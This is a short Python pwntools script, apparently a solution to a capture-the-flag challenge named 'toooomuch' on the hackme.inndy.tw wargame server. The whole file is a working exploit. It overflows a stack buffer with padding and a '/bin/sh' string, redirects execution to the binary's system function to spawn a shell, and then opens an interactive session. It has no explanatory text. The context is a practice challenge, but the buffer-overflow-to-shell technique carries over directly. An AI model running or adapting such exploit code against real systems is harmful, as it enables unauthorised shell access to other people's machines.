#!/usr/bin/env python
# encoding: utf-8

from pwn import *
context.log_level = 'debug'
# io = process('./toooomuch')
io = remote('hackme.inndy.tw', 7702)
elf = ELF('./toooomuch')
bss = 0x8049c60
sys = elf.sym['system']
fake_flag = elf.sym['print_flag']
passcode = '43210'
payload = '/bin/sh' + '\x00' + 'a' * (0x18 + 4 -8)
payload += p32(sys) + p32(fake_flag) + p32(bss) 
io.recvuntil('code: ')
io.sendline(payload)
io.interactive()
io.close()
